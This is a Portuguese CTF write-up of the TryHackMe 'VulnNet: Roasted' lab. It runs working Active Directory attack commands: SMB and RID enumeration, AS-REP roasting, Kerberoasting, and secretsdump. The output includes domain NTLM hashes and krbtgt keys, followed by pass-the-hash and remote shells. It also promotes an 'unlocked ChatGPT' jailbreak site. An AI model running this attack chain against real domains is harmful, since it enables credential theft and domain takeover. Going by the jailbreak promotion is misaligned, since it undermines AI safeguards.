---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - VulnNet Roasted - Fácil
date: 2024-02-03 01:20:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, windows, active directory, facil, impacket, crackmapexec]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img/vulnetroast.png){: w="100" h="100" .left}

---

# **CTF - VulnNet: Roasted**
---
---
## **Enumeração**


### nmap


```shell
─      ~/thm/VulnNetRoasted                               ✔  3m 13s   
╰─ sudo nmap -sV -Pn --min-rate 1000 --stats-every=7s 10.10.78.166 -p- -oN nmap --max-retries=3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 05:33 -03
Nmap scan report for vulnnet-rst.local (10.10.78.166)
Host is up (0.25s latency).
Not shown: 65525 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-02 08:36:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49806/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.51 seconds
```
{: .nolineno }

### smb

```shell
╭─      ~/thm/VulnNetRoasted                             ✔  9s   
╰─ smbclient -L //10.10.78.166                                                                                
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.78.166 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
╭─      ~/thm/VulnNetRoasted          ✔  52s   
╰─ smbclient  //10.10.78.166/VulnNet-Business-Anonymous 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 23:46:40 2021
  ..                                  D        0  Fri Mar 12 23:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 22:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 22:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 22:24:34 2021

                8540159 blocks of size 4096. 4191186 blocks available
smb: \> get Business-*
NT_STATUS_OBJECT_NAME_INVALID opening remote file \Business-*                                                                                                                
smb: \> get Business-Manager.txt 
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get Business-Sections.txt 
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get Business-Tracking.txt 
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.2 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit
╭─      ~/thm/VulnNetRoasted                                   ✔  2m 41s   
╰─ smbclient  //10.10.78.166/VulnNet-Enterprise-Anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 23:46:40 2021
  ..                                  D        0  Fri Mar 12 23:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 22:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 22:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 22:24:34 2021

                8540159 blocks of size 4096. 4295906 blocks available
smb: \> get Enterprise-Operations.txt 
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get Enterprise-Safety.txt 
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> get Enterprise-S
Enterprise-Safety.txt  Enterprise-Sync.txt    
smb: \> get Enterprise-Sync.txt 
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
```
{: .nolineno }

Permissão de leitura em IPC$, sem arquivos.

```shell
╭─      ~/thm/VulnNetRoasted                              ✔  16s   
╰─ crackmapexec smb 10.10.78.166 -u anonymous -p '' --shares --users
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\anonymous: 
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share 
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share 
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  [-] Error enumerating domain users using dc ip 10.10.78.166: NTLM needs domain\username and a password
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  [*] Trying with SAMRPC protocol

```
{: .nolineno }

### Lendo os arquivos .txt baixados do smb

```shell
╭─      ~/thm/VulnNetRoasted                                 ✔  1m 32s   
╰─ cat Business-Manager.txt 
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 
We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers. 
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We’re here to help, regardless of which you plan you’re on or if you’re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly. 
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
╭─      ~/thm/VulnNetRoasted                                 ✔ 
╰─ cat Business-Sections.txt 
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
╭─      ~/thm/VulnNetRoasted                                                                                                                                         ✔ 
╰─ cat Business-Tracking.txt 
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. 
You won't miss anything ever again. 

~VulnNet Entertainment
~TryHackMe

╭─      ~/thm/VulnNetRoasted                                                                                                                                         ✔ 
╰─ cat Enterprise-Operations.txt 
VULNNET OPERATIONS
~~~~~~~~~~~~~~~~~~~~

We bring predictability and consistency to your process. Making it repetitive doesn’t make it boring. 
Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.
Don't wait for an opportunity to knock - build the door. Contact us right now.
VulnNet Entertainment is fully commited to growth, security and improvement.
Make a right decision!

~VulnNet Entertainment
~TryHackMe
╭─      ~/thm/VulnNetRoasted                                                                                                                                         ✔ 
╰─ cat Enterprise-Safety.txt 
VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
We keep your data safe and private. When it comes to protecting your private information...
we’ve got it locked down tighter than Alcatraz. 
We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups. 
And we never, EVER disclose any data to third-parties without your permission. 
Rest easy, nothing’s getting out of here alive.

~VulnNet Entertainment
~TryHackMe
╭─      ~/thm/VulnNetRoasted                                                                                                                                         ✔ 
╰─ cat Enterprise-Sync.txt 
VULNNET SYNC
~~~~~~~~~~~~~~

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,
auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.
Say no more to desync problems.
To contact our sync manager call this number: 7331 0000 1337

~VulnNet Entertainment
~TryHackMe
```
{: .nolineno }
Com esses arquivo deu pra enumerar 4 possíveis usuários, e esse é um usuário de interesse.  
 `Tony Skid is a core security manager`

Adicionado os nomes abaixo em users.txt
Tony Skid  
Alexa Whitehat  
jack Goldenhand  
Johnny Leet  
tony skid   
alexa whitehat  
jack goldenhand  
johnny leet  

### Enumerando usuários via crackmapexec

```shell
╭─      ~/thm/VulnNetRoasted                                                                                                                                ✔  31s   
╰─ crackmapexec smb 10.10.78.166 -u anonymous -p '' --rid-brute 10000
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\anonymous: 
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  [+] Brute forcing RIDs
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.10.78.166    445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```
{: .nolineno }  
Confirmado usuários:  
`a-whitehat`    
`t-skid`  
`j-goldenhand`  
`j-leet`  

### Confirmando os usuários com kerbrute.

```shell
╭─      ~/thm/VulnNetRoasted                     INT ✘ 
╰─ ./kerbrute userenum --dc 10.10.203.48 -d vulnnet-rst.local users.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/02/24 - Ronnie Flathers @ropnop

2024/02/02 06:17:26 >  Using KDC(s):
2024/02/02 06:17:26 >   10.10.203.48:88

2024/02/02 06:17:27 >  [+] VALID USERNAME:       t-skid@vulnnet-rst.local
2024/02/02 06:17:27 >  [+] VALID USERNAME:       a-whitehat@vulnnet-rst.local
2024/02/02 06:17:27 >  [+] VALID USERNAME:       j-goldenhand@vulnnet-rst.local
2024/02/02 06:17:27 >  [+] VALID USERNAME:       j-leet@vulnnet-rst.local
```
{: .nolineno }

## **Escalação de privilégio**

Tentando obter alguma hash através do impacket com ataque ASREPRoasting.
> O ASREPRoasting é um ataque que explora uma vulnerabilidade no protocolo de autenticação Kerberos, usado em ambientes Windows. Ele tem como alvo contas de usuário que possuem a opção “Do not require Kerberos preauthentication” habilitada, o que permite que um atacante extraia hashes criptografados dos pacotes de autenticação AS-REP, que são enviados pelo controlador de domínio. leia mais aqui <https://blog.ironlinux.com.br/atacando-o-kerberos-as-rep-roasting/>
 {: .prompt-danger}
![alt text](/assets/img/vulnetroast1.png)

### Crackeando Hash
Hash adicionada ao john

![alt text](/assets/img/vulnetroast2.png)

### Enumerando com usuário t-skid
Listando o smb com o usuário t-skid

```shell
╭─      ~                ✘    
╰─ crackmapexec smb 10.10.182.156 -u 't-skid' -p 'tj072889*' --shares                  
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```
{: .nolineno }

#### Mapeando arquivos nas pastas

```shell
╭─      ~                        ✔  21s      
╰─ crackmapexec smb 10.10.182.156 -u 't-skid' -p 'tj072889*' -M spider_plus
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.182.156   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
SPIDER_P... 10.10.182.156   445    WIN-2BO8M1OE1M1  [*] Started spidering plus with option:
SPIDER_P... 10.10.182.156   445    WIN-2BO8M1OE1M1  [*]        DIR: ['print$']
SPIDER_P... 10.10.182.156   445    WIN-2BO8M1OE1M1  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.10.182.156   445    WIN-2BO8M1OE1M1  [*]       SIZE: 51200
SPIDER_P... 10.10.182.156   445    WIN-2BO8M1OE1M1  [*]     OUTPUT: /tmp/cme_spider_plus
```
{: .nolineno }

Arquivos de interesse retornado pelo crackmapexec

```text
 },
    "NETLOGON": {
        "ResetPassword.vbs": {
            "atime_epoch": "2021-03-16 20:18:14",
            "ctime_epoch": "2021-03-16 20:15:49",
            "mtime_epoch": "2021-03-16 20:18:14",
            "size": "2.75 KB"
        }
    },
    "SYSVOL": {
        "vulnnet-rst.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2021-03-12 23:53:26",
            "ctime_epoch": "2021-03-11 16:20:26",
            "mtime_epoch": "2021-03-12 23:53:26",
            "size": "22 Bytes"
```
{: .nolineno }

O usuário `t-skid` não consegue baixar os arquivos e nem ver.  

![alt text](/assets/img/vulnetroast3.png)
#### Buscando por usuários SPN - Kerberoasting  
>  Leia sobre aqui <https://blogs.manageengine.com/portugues/2021/11/30/o-que-e-o-kerberoasting-e-como-detecta-lo.html>
{: .prompt-tip }

```shell
╭─      ~/thm/VulnNetRoasted ✔ 
╰─ impacket-GetUserSPNs vulnnet-rst.local/t-skid -dc-ip 10.10.203.48 -request
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 16:45:09.913979  2021-03-13 20:41:17.987528             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$0ddae3ec0028ccd1d1a3ce05bf0c272c$1aba5243bd21c30061d8cb8743892b27ca61df393e63703f67a639a416ac48b5842010a1eb90af92a928de9b4e77a8e9c362b13d488fe1956575db4fef6bda54610f9cfe4e4b4a8612bf54f8d9068b31d65905bf411a2c709a8131a8d2c811b6647d41639504cdacf36fbb88bafceac56ac55419eeecc3af6864d0de4f91941aec14d81231c99b29bf5297a8b376290d40624cba00d99cf20e6a3e1d2666f68018314a8c1f49a23c3d1c107b966666f3969a40bd6d5a2fb3778dfa329702146eab605b11dae3b6f01b62886241f2b20d662927b988ba7832aa6a738fc62f4b45deb7177043773c15a8e5c4c077f5789fe2093f272b9f980853817d0219143460cf571d8a3f595c6d7aa0f6f9ea5b6ebc9c1b655725701beae946c7ce8eda55c701e1c754a1764add51de7ea0409e190220fb83bb52e58028cbb0c723a528da8378f9e3d01e5b540fa075355bf63ba70c448520c42e15b2459bcf5b79b5b05f44fadfb6c021a3e94955150122da0abc540489fad1e6edfd0bc05b32ba451fc45b2367344153550d313e5bc9f3dc640cdd2d342fe70ee4107a68c319b9c596c0dcfce7013a5235dd183f76da39ade6f924e0739cdd57aae9351eea68b6a5ef98f9e45768f32a8e9288eb7724d6930eb3e3075a8cacda98f2c701b923dccc8dccee9d60305f3ccce71cb1595e93a7b584e15792603a475adb96f34bed2d38a1955dae605b3ac36f69b60f44b12943290284ec3bc4d209392ec6e82941b9ba6d05343a32bd11177a3571233196d44355d534eeaa04bf6c8d21490493ddfd9dd65aa540719e91b4cbfee3de7943cb36ef611465c0bf5f81f6ee9fad61019660650c89cf4566733eaa42bb06282edd9bd8b8be4e0ea76d69803017b1a6fa64d199873f73e15d936611888a4337b3589d0d91825d06de9bcc2e20647d96784948ea7e39b01e7e457c2496f8f7a0080c192323667f6d17bb914cc31c852fd361f13f88c670abb936a8f6878510cb65960fecfb2ca215215c1f9a26aab74a3421b31e283085ac21e72eba1e57bba4154216d675103f89441d10f557470fc967c4b168ee40775c4cd079b607161d63ed80eaff306d45340539b9111a4fbb0ec70f06bef335e032ca0ba782e984bbb167a474c684d85df85a4471ec31af4c294da29891a0b5d1375a38aba275057aeb3d76104a90fbe0b894447b41cb3e82ae289c13c842af689caceb9347d04fadec276a83c41b5b98f5f94ff48a6588fe66854b71e38200b69bcd76483b6425d2e427f2cb4dff30d7283c32f463a056dcb610f73e11f11c83ea3bc6bffbda55c002270b634c9e6d8c4c26de14d921de197b3e252581924c4dcd3c1084a088ddd4ceeed40962671ffbcfa896a6f48335bd4c8c12a0
```
{: .nolineno }
ChatGPT Desbloqueado respondendo sobre SPN  
Acesse aqui: <https://www.hackaigc.com>  
![alt text](/assets/img/vulnetroast4.png)

Colocada a hash no john
![alt text](/assets/img/vulnetroast5.png)

Tentando logar via evil-winrm

![alt text](/assets/img/vulnetroast6.png)

### Primeira Flag
![alt text](/assets/img/vulnetroast7.png)

Com as credenciais de `enterprise-core-vn` foi possível baixar o arquivo `ResetPassword.vbs`, onde contém senha do usuário `a-whitehat`  

![alt text](/assets/img/vulnetroast8.png)

### Enumerando SMB com usuário a-whitehat
![alt text](/assets/img/vulnetroast9.png)

Nem via SMB e nem via evil consigo acessar o Desktop do administrator pra pegar flag.


Como `a-whitehat` tem privilégios administrativos vou dumpar a SAM Database

```shell
╭─      ~/thm/VulnNetRoasted            ✔  10s   
╰─ impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.35.241 -just-dc
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:8458e52547ee1e91c078cb65076e01cc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:6388d319fb4e58df70e910739a7d974df6f171f17d33c38480f43d1fb24563a1
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:a575f8212d0cdef0133cbdca23fe389e
WIN-2BO8M1OE1M1$:des-cbc-md5:a4130b38ba26bad3
[*] Cleaning up... 
```
{: .nolineno }

### Logando no evil com a hash do admin:
![alt text](/assets/img/vulnetroast10.png)

### Flag System obetida
![alt text](/assets/img/vulnetroast11.png)

`Outras formas de obter shell além do evil.`
Essa não funcionou
```shell
╭─      ~/thm/VulnNetRoasted        35m 16s      
╰─ impacket-psexec vulnnet-rst.local/a-whitehat@10.10.35.241 
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.10.35.241.....
[*] Found writable share ADMIN$
[*] Uploading file frlywdak.exe
[*] Opening SVCManager on 10.10.35.241.....
[*] Creating service FEES on 10.10.35.241.....
[*] Starting service FEES.....
[*] Opening SVCManager on 10.10.35.241.....
[*] Stopping service FEES.....
[*] Removing service FEES.....
[*] Removing file frlywdak.exe.....
```
{: .nolineno }
Essa sim

```shell
╭─      ~/thm/VulnNetRoasted                               1 ✘  3m 3s      
╰─ impacket-wmiexec  vulnnet-rst.local/a-whitehat@10.10.35.241
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
{: .nolineno }

**Conhecimento adquiridos:**
- Sempre enumerar novamente com as credenciais do novo usuário descoberto.
- Enumeração com a ferramenta cracmapexec
- Ataque Kerberoasting
  
Gostaria de testar mais coisas nessa máquina, mas cada comando durava quase 1 minuto pra retornar via shell.